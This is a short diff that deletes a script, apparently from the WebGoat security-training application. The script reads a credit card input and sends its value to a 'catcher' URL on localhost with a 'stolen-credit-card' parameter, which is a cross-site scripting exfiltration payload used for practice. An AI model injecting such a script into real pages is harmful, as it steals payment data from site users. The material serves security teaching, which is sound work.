@@ -1,9 +1,0 @@
-<script>
-	var creditCardNumber = document.getElementsByName("input1").value;
-    var xhr = new XMLHttpRequest();
-	var url = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card=" + creditCardNumber;
-    xhr.open("POST", url, true);
-    xhr.send(null);
-</script>
-
-
